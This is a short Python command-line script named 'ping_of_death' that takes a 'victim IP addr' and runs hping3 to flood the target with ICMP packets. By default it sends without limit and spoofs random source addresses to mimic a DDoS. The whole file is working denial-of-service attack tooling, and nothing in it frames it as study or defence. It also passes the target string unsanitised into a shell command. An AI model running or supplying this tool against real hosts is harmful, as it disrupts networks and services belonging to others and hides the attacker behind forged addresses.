import click
import os


@click.command("ping_of_death", help="attack vimim with ping of death attack")
@click.option("--target", prompt="victim IP addr", help="victim to attack.")
@click.option("--ddos", default=True, help="enable ddos simulate")
@click.option("--num", default=-1, help="number of packages, default = -1 (flood)")
@click.option("--payload", default=120, help="size of payload, default = 120")
def ping_of_death(target, payload, ddos, num):
    os.system("clear")
    os.system(
        "$(which hping3) %s -q --icmp -n -d %s -p 80 %s %s"
        % (
            target,
            payload,
            "--flood" if num == -1 else "-c %s" % (num),
            "--rand-source" if ddos else "",
        )
    )
    print("End of Flooding attack. ")


if __name__ == "__main__":
    ping_of_death()
